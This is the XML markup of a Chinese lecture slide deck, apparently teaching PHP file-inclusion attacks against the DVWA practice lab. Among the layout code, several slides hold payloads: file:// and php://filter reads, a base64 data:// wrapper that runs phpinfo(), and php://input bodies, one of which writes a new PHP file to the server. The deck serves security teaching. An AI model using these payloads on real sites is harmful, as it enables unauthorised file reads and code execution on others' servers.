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57" r:id="rId3"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId5"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId4"/>
    <p:sldId id="635" r:id="rId6"/>
    <p:sldId id="765" r:id="rId7"/>
    <p:sldId id="613" r:id="rId8"/>
    <p:sldId id="716" r:id="rId9"/>
    <p:sldId id="663" r:id="rId10"/>
    <p:sldId id="722" r:id="rId11"/>
    <p:sldId id="719" r:id="rId12"/>
    <p:sldId id="723" r:id="rId13"/>
    <p:sldId id="752" r:id="rId14"/>
    <p:sldId id="764" r:id="rId15"/>
    <p:sldId id="753" r:id="rId16"/>
    <p:sldId id="755" r:id="rId17"/>
    <p:sldId id="766" r:id="rId18"/>
    <p:sldId id="757" r:id="rId19"/>
    <p:sldId id="759" r:id="rId20"/>
    <p:sldId id="791" r:id="rId21"/>
    <p:sldId id="793" r:id="rId22"/>
    <p:sldId id="794" r:id="rId23"/>
    <p:sldId id="799" r:id="rId24"/>
    <p:sldId id="806" r:id="rId25"/>
    <p:sldId id="801" r:id="rId26"/>
    <p:sldId id="803" r:id="rId27"/>
    <p:sldId id="804" r:id="rId28"/>
    <p:sldId id="811" r:id="rId29"/>
    <p:sldId id="812" r:id="rId30"/>
    <p:sldId id="815" r:id="rId31"/>
    <p:sldId id="814" r:id="rId32"/>
    <p:sldId id="631" r:id="rId3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69" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="3839" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="3" pos="6766" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" pos="889" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="648" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" orient="horz" pos="51" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="7" orient="horz" pos="3992" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="8" orient="horz" pos="3245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李 华" initials="李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EFEF"/>
    <a:srgbClr val="1A4157"/>
    <a:srgbClr val="394479"/>
    <a:srgbClr val="D9D9D9"/>
    <a:srgbClr val="BC3649"/>
    <a:srgbClr val="557788"/>
    <a:srgbClr val="8CA3AE"/>
    <a:srgbClr val="416C69"/>
    <a:srgbClr val="006C30"/>
    <a:srgbClr val="ADB5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 autoAdjust="0"/>
    <p:restoredTop sz="71108" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" showGuides="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="60" d="100"/>
          <a:sy n="60" d="100"/>
        </p:scale>
        <p:origin x="1459" y="24"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide orient="horz" pos="1669"/>
        <p:guide pos="3839"/>
        <p:guide pos="6766"/>
        <p:guide pos="889"/>
        <p:guide orient="horz" pos="648"/>
        <p:guide orient="horz" pos="51"/>
        <p:guide orient="horz" pos="3992"/>
        <p:guide orient="horz" pos="324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7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/commentAuthors" Target="commentAuthors.xml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B8F2AF-B165-49ED-8D49-F91D3C9FFCC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0F3238-B197-4DD0-8393-B222E6E8551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F3238-B197-4DD0-8393-B222E6E855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F3238-B197-4DD0-8393-B222E6E855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F3238-B197-4DD0-8393-B222E6E855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F3238-B197-4DD0-8393-B222E6E855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F3238-B197-4DD0-8393-B222E6E855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F3238-B197-4DD0-8393-B222E6E855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F3238-B197-4DD0-8393-B222E6E855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?page=file://D:\PHPStudy\phpstudy_pro\WWW\DVWA</a:t>
            </a:r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master\vulnerabilities\fi\XX.txt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F3238-B197-4DD0-8393-B222E6E855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data://text/plain;base64,PD9waHANCiAgICBwaHBpbmZvKCk7DQo/Pg==</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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F3238-B197-4DD0-8393-B222E6E855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?page=php://input + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN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[POST 内容]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="12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&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="12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php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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phpinfo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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();?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="12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2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2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zh-CN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?page=php://input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN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[POST 内容]</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="12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zh-CN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&lt;?php fputs(fopen('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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number</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN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.php','w'),'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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1234567890</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN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'); ?&gt;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F3238-B197-4DD0-8393-B222E6E855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?page=php://filter/read=convert.base64-encode/resource=XX64.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="12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F3238-B197-4DD0-8393-B222E6E855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F3238-B197-4DD0-8393-B222E6E855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F3238-B197-4DD0-8393-B222E6E855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882" y="23088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925" y="3565525"/>
            <a:ext cx="10852150" cy="80137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40105" y="727710"/>
            <a:ext cx="3931920" cy="1115060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8420" y="727710"/>
            <a:ext cx="6172200" cy="5403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40105" y="2239645"/>
            <a:ext cx="3931920" cy="389191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>
              <a:sym typeface="+mn-ea"/>
            </a:endParaRP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669925" y="5605145"/>
            <a:ext cx="10852150" cy="558165"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>单击此处编辑母版标题样式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/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="641350"/>
            <a:ext cx="10852150" cy="4556125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="101600" tIns="0" rIns="82550" bIns="0" rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="914400">
              <a:def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defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="457200" lvl="1" indent="0" defTabSz="914400">
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="1609725" algn="l"/>
              </a:tabLst>
              <a:def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defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" defTabSz="914400">
              <a:def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defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" defTabSz="914400">
              <a:def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defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" defTabSz="914400">
              <a:def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6445" cy="68681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95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7770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623591"/>
            <a:ext cx="10852237" cy="899167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alphaModFix amt="5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6" y="1"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9801" name="副标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="673100" y="3870251"/>
            <a:ext cx="10845800" cy="468637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="384479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zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9802" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="673099" y="2920209"/>
            <a:ext cx="10845800" cy="894050"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr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673099" y="4394880"/>
            <a:ext cx="10845800" cy="37147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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13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673099" y="4766355"/>
            <a:ext cx="10845800" cy="37147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日期</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN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381000" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C425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381000" cy="381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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 1"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8763001" y="6477000"/>
            <a:ext cx="3429000" cy="381000"/>
            <a:chOff x="8763001" y="6477000"/>
            <a:chExt cx="3429000" cy="381000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="5400000">
              <a:off x="10287001" y="4953000"/>
              <a:ext cx="381000" cy="3429000"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="C425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/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="14" name="Rectangle 13"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="5400000">
              <a:off x="11811001" y="6477000"/>
              <a:ext cx="381000" cy="38100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/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1028" name="Picture 4" descr="http://zsjy.gzhu.edu.cn/images/pic_logo.png"/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45034" b="-7143"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="391886" y="-1"/>
            <a:ext cx="3463289" cy="1028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3086" y="-39914"/>
            <a:ext cx="1113116" cy="1113116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5063" y="-19958"/>
            <a:ext cx="1484186" cy="1068614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11582401" y="381000"/>
            <a:ext cx="609600" cy="6477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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582400" y="0"/>
            <a:ext cx="612648" cy="61264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10" name="Picture Placeholder 28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3352800" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-MY"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3944679" y="0"/>
            <a:ext cx="7575809" cy="1028700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" anchor="b" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr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>
            <a:alphaModFix amt="8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1266"/>
            <a:ext cx="12192000" cy="6879266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>
          <a:xfrm>
            <a:off x="11582401" y="381000"/>
            <a:ext cx="609600" cy="64770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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="0"/>
            <a:ext cx="609600" cy="61264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4541217" y="1516136"/>
            <a:ext cx="3109566" cy="911046"/>
            <a:chOff x="4541217" y="1516136"/>
            <a:chExt cx="3109566" cy="911046"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4541217" y="1516136"/>
              <a:ext cx="3109566" cy="651569"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="381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sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Right Triangle 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="18900000">
              <a:off x="5913103" y="2056199"/>
              <a:ext cx="365794" cy="370983"/>
            </a:xfrm>
            <a:prstGeom prst="rtTriangle">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:ln w="381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dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grp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3078333" y="2721935"/>
            <a:ext cx="6039972" cy="1435395"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2800" b="1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单击此处添加幻灯片章节标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="文本占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="4327286"/>
            <a:ext cx="6039972" cy="443643"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="002060"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1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>
            <a:alphaModFix amt="8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1266"/>
            <a:ext cx="11649807" cy="6879266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>
          <a:xfrm>
            <a:off x="11582401" y="381000"/>
            <a:ext cx="609600" cy="64770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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="0"/>
            <a:ext cx="609600" cy="61264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4541217" y="1516136"/>
            <a:ext cx="3109566" cy="911046"/>
            <a:chOff x="4541217" y="1516136"/>
            <a:chExt cx="3109566" cy="911046"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4541217" y="1516136"/>
              <a:ext cx="3109566" cy="651569"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="381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sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Right Triangle 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="18900000">
              <a:off x="5913103" y="2056199"/>
              <a:ext cx="365794" cy="370983"/>
            </a:xfrm>
            <a:prstGeom prst="rtTriangle">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:ln w="381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dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grp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3078333" y="2721935"/>
            <a:ext cx="6039972" cy="1435395"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2800" b="1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单击此处添加幻灯片章节标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="文本占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="4327286"/>
            <a:ext cx="6039972" cy="443643"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="002060"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1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alphaModFix amt="8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609756" cy="6858000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>
          <a:xfrm>
            <a:off x="11582401" y="381000"/>
            <a:ext cx="609600" cy="64770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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="0"/>
            <a:ext cx="609600" cy="61264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4541217" y="1516136"/>
            <a:ext cx="3109566" cy="911046"/>
            <a:chOff x="4541217" y="1516136"/>
            <a:chExt cx="3109566" cy="911046"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4541217" y="1516136"/>
              <a:ext cx="3109566" cy="651569"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="381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sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Right Triangle 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="18900000">
              <a:off x="5913103" y="2056199"/>
              <a:ext cx="365794" cy="370983"/>
            </a:xfrm>
            <a:prstGeom prst="rtTriangle">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:ln w="381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dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grp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3078333" y="2721935"/>
            <a:ext cx="6039972" cy="1435395"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2800" b="1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单击此处添加幻灯片章节标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="文本占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="4327286"/>
            <a:ext cx="6039972" cy="443643"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1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alphaModFix amt="8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582401" cy="6858000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>
          <a:xfrm>
            <a:off x="11582401" y="381000"/>
            <a:ext cx="609600" cy="64770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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="0"/>
            <a:ext cx="609600" cy="61264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4541217" y="1516136"/>
            <a:ext cx="3109566" cy="911046"/>
            <a:chOff x="4541217" y="1516136"/>
            <a:chExt cx="3109566" cy="911046"/>
          </a:xfrm>
          <a:noFill/>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4541217" y="1516136"/>
              <a:ext cx="3109566" cy="651569"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:grpFill/>
            <a:ln w="381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sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Right Triangle 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="18900000">
              <a:off x="5913103" y="2056199"/>
              <a:ext cx="365794" cy="370983"/>
            </a:xfrm>
            <a:prstGeom prst="rtTriangle">
              <a:avLst/>
            </a:prstGeom>
            <a:grpFill/>
            <a:ln w="381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dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grp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3078333" y="2721935"/>
            <a:ext cx="6039972" cy="1435395"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2800" b="1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单击此处添加幻灯片章节标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="文本占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="4327286"/>
            <a:ext cx="6039972" cy="443643"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1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 userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="6248400"/>
            <a:ext cx="12192000" cy="609600"/>
            <a:chOff x="0" y="6248400"/>
            <a:chExt cx="12192000" cy="609600"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="6248400"/>
              <a:ext cx="12192000" cy="6096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 dirty="0"/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0" y="6248400"/>
              <a:ext cx="152400" cy="6096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24" y="0"/>
            <a:ext cx="10850563" cy="1028700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="394479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669925" y="1028700"/>
            <a:ext cx="10850563" cy="45719"/>
            <a:chOff x="0" y="990600"/>
            <a:chExt cx="12192001" cy="45719"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="C4251F"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Rectangle 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="990600"/>
              <a:ext cx="11811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1623040" y="990600"/>
              <a:ext cx="568961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/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grp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4482" y="6206331"/>
            <a:ext cx="963524" cy="69373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9426" y="6235700"/>
            <a:ext cx="622300" cy="62230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2572" y="6176962"/>
            <a:ext cx="2438400" cy="752475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="1123950"/>
            <a:ext cx="10850563" cy="5019675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 userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="6248400"/>
            <a:ext cx="12192000" cy="609600"/>
            <a:chOff x="0" y="6248400"/>
            <a:chExt cx="12192000" cy="609600"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="6248400"/>
              <a:ext cx="12192000" cy="6096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 dirty="0"/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0" y="6248400"/>
              <a:ext cx="152400" cy="6096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24" y="0"/>
            <a:ext cx="10850563" cy="1028700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="394479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669925" y="1028700"/>
            <a:ext cx="10850563" cy="45719"/>
            <a:chOff x="0" y="990600"/>
            <a:chExt cx="12192001" cy="45719"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="C4251F"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Rectangle 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="990600"/>
              <a:ext cx="11811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1623040" y="990600"/>
              <a:ext cx="568961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/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grp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4482" y="6206331"/>
            <a:ext cx="963524" cy="69373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9426" y="6235700"/>
            <a:ext cx="622300" cy="62230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2572" y="6176962"/>
            <a:ext cx="2438400" cy="752475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92000" cy="6858001"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="标题 1"/>
